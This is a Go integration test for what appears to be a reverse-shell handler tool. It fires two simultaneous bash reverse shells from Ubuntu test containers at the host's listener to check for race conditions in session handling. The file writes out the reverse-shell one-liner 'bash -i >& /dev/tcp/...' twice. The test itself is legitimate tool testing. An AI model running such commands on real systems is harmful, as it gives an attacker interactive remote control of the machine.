//go:build integration

package main

import (
	"fmt"
	"sync"
	"testing"
	"time"

	"github.com/smavl/gok/internal/cli"
	"github.com/smavl/gok/internal/core"
	"github.com/stretchr/testify/require"
)

func TestAutoInteractTwoSessionsRace(t *testing.T) {
	hostIP := "0.0.0.0"
	connectIP := "172.17.0.1"

	probingCmdTimeout := 60 * time.Millisecond
	cfg := cli.Config{
		PortRange:         cli.PortRange{Ports: []int{9004, 9005}},
		BindIps:           []string{hostIP},
		HeadlessMode:      true,
		ProbingCmdTimeout: probingCmdTimeout,
		AutoInteract:      true, // Triggers concurrent Enter() calls
	}
	c := core.NewCore(cfg)
	go c.Start()

	// Start two containers
	tc1 := StartContainer(t, "ubuntu:22.04")
	tc2 := StartContainer(t, "ubuntu:22.04")

	// Launch both reverse shells simultaneously to maximize race chance
	var wg sync.WaitGroup
	wg.Add(2)

	// Fire both at the exact same time
	go func() {
		defer wg.Done()
		revCmd := fmt.Sprintf("nohup bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &", connectIP, 9004)
		tc1.Exec(t, []string{"bash", "-c", revCmd})
	}()

	go func() {
		defer wg.Done()
		revCmd := fmt.Sprintf("nohup bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &", connectIP, 9005)
		tc2.Exec(t, []string{"bash", "-c", revCmd})
	}()

	wg.Wait()

	// Both sessions should land without crashes/panics/races
	require.Eventually(t, func() bool {
		return c.SessionManager.GetAmountOfSessions() == 2
	}, 10*time.Second, 100*time.Millisecond, "Expected two sessions to land")

	// Both should complete probing without races
	sessions := c.SessionManager.GetSessions()
	require.Len(t, sessions, 2)

	for _, s := range sessions {
		require.Eventually(t, func() bool {
			return s.IsProberDone()
		}, 5*time.Second, 50*time.Millisecond)
	}
}
